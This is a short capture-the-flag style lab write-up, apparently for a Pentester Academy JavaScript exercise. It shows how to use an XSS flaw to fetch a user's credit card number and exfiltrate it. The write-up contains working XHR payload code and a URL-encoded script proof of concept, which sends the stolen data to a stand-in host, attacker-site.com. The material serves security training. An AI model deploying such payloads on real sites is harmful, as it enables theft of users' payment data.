## Task 15 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/15)</small>

Objectives:

1. Find John's Credit Card Number using an XSS vulnerability on this page
2. Post the Credit Card Number to your Attacker Server

So this is pretty much same as [TASK_14](https://github.com/tbhaxor/pt-jsfp/blob/main/TASK_14.md). Only the URL is changed and delivery method is changed

So the target URL is `http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore`, and we have to send a POST XHR with `user=john` data

You can send the POST body in `.send` method of XHR object. [See this example](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send#Example_POST)

```js
const xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    new Image().src = "http://attacker-site.com?card=" + xhttp.responseText;
  }
};
xhttp.open("POST", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/15/cardstore", true);
xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhttp.send("user=john");
```

For POC, [Click Here](%3Cscript%3Econst%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhttp.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20new%20Image%28%29.src%20%3D%20%22http%3A%2F%2Fattacker-site.com%3Fcard%3D%22%20%2B%20xhttp.responseText%3B%0A%20%20%7D%0A%7D%3B%0Axhttp.open%28%22POST%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F15%2Fcardstore%22%2C%20true%29%3B%0Axhttp.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Axhttp.send%28%22user%3Djohn%22%29%3B%0A%3C%2Fscript%3E)
